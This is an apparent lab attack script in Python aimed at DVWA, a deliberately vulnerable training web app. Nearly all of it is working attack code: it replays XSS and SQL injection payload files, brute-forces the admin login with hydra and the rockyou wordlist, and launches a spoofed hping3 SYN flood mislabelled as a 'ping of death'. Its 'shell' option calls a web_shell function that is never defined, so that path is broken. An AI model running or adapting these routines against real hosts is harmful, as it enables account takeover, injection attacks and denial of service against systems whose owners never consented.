import requests
import os
import argparse

s = requests.Session()

def login(url):
    r = s.post(url + "/DVWA/login.php", data={"username": "admin", "password": "password", "Login": "login"})
    s.cookies.pop("security", None)
    s.cookies.set("security", "low", domain=url.split("//")[1])
    print("[*] Logged in and set security to low")

def xss_attack(target):
    with open("xss.txt", "r") as f:
        for i in f.readlines():
            r = s.get(f"{target}/DVWA/vulnerabilities/xss_r/?name={i}", cookies={"security": "low"})

def sqli_attack(target):
    with open("sql.txt", "r") as f:
        for i in f.readlines():
            r = s.get(f"{target}/DVWA/vulnerabilities/sqli/?id={i}&Submit=Submit", cookies={"security": "low"})

def password_attack(target):
    target_ip = target.split("http://")[1]
    print("[*] Starting brute-force attack...")
    os.system(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form '/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed'")


def ping_of_death(target):
    target_ip = target.split("http://")[1]
    os.system(f"hping3 {target_ip} -c 10 -d 120 -S -p 80 --flood --rand-source")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("method", choices=["login", "xss", "sqli", "brute", "shell", "ping"])
    parser.add_argument("target", help="Target DVWA URL, e.g., http://192.168.100.4")

    args = parser.parse_args()
    target = args.target

    if args.method == "login":
        login(target)
    elif args.method == "xss":
        xss_attack(target)
    elif args.method == "sqli":
        sqli_attack(target)
    elif args.method == "brute":
        password_attack(target)
    elif args.method == "shell":
        web_shell(target)
    elif args.method == "ping":
        ping_of_death(target)
